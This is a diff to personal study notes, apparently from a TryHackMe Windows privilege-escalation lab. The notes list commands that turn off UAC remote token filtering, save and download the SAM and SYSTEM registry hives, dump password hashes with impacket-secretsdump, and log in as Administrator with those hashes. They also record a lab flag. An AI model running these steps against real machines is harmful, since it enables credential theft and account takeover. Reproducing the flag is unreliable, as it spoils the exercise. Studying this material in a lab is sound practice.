@@ -24,8 +24,25 @@ whoami /groups
 -LocalAccountTokenFilterPolicy implemented by User Account Control (UAC) - strips admin privileges when logging in remotely
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 
+*stay in directory: C:\Users\thmuser1\Documents
+
 (on evil-winrm)
 reg save hklm\system system.bak
 reg save hklm\sam sam.bak
 download system.bak
 download sam.bak
+
+-attacker machine
+(apt install python3-impacket)
+impacket-secretsdump -sam sam.bak -system system.bak LOCAL
+-get hashes
+-log into administator using hashes
+evil-winrm -i [IP] -u Administrator
+THM{FLAG_BACKED_UP!}
+
+Special Privileges and Security Descriptors
+-SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
+-SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.
+
+
+
